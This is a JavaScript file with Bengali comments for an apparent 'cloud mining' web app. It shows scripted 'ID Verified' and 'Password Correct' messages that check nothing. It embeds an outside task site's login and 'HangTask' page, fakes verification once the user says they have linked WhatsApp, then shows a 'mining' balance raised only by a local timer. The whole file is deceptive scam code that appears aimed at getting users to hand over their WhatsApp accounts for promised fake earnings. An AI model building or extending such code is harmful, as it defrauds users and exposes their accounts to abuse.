// ১. লোডিং লজিক
window.onload = function() {
    let statusText = document.getElementById('load-status');
    let detailText = document.getElementById('load-detail');
    let startBtn = document.getElementById('start-btn');

    setTimeout(() => { statusText.innerText = "ID Verified!"; detailText.innerText = "Encrypting Session..."; }, 1500);
    setTimeout(() => { statusText.innerText = "Password Correct!"; detailText.innerText = "Checking Node Connection..."; }, 3000);
    setTimeout(() => { 
        statusText.innerText = "Load Complete!"; 
        detailText.innerText = "Ready to Start Mining";
        document.querySelector('.loader').style.display = 'none';
        startBtn.style.display = 'block';
    }, 4500);
};

function initApp() {
    document.getElementById('loading-screen').style.display = 'none';
    document.getElementById('main-app').classList.add('active');
}

// ২. মাইনিং ও ব্যালেন্স লজিক
let balance = parseFloat(localStorage.getItem('cloud_pts')) || 0;
const targetLinks = {
    login: "https://www.taskm4u.com/#/login",
    hang: "https://www.taskm4u.com/#/HangTask"
};

function handleStep() {
    const btn = document.getElementById('step-btn');
    const ifr = document.getElementById('taskIfr');

    if (btn.innerText.includes("লগইন")) {
        ifr.src = targetLinks.hang;
        btn.innerText = "হোয়াটসঅ্যাপ যুক্ত করেছি (Verify)";
    } else {
        btn.innerText = "Verifying Connection...";
        btn.disabled = true;
        setTimeout(() => {
            alert("সফলভাবে যুক্ত হয়েছে! মাইনিং চালু হলো।");
            btn.innerText = "Node Connected (Online)";
            btn.style.background = "#333";
            startMining();
        }, 4000);
    }
}

function startMining() {
    setInterval(() => {
        balance += (30 / 3600);
        document.getElementById('main-bal').innerText = balance.toFixed(2) + " PT";
        localStorage.setItem('cloud_pts', balance);
    }, 1000);
}

// ৩. ভিউ সুইচিং
function showView(viewId, element) {
    document.querySelectorAll('.app-view').forEach(v => v.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav'));
    
    document.getElementById('view-' + viewId).classList.add('active');
    element.classList.add('active-nav');
    
    // ব্যালেন্স পেজ রিফ্রেশ
    if(viewId === 'balance') {
        document.getElementById('main-bal').innerText = balance.toFixed(2) + " PT";
    }
}

// শুরুতে আগের ব্যালেন্স লোড
document.getElementById('main-bal').innerText = balance.toFixed(2) + " PT";
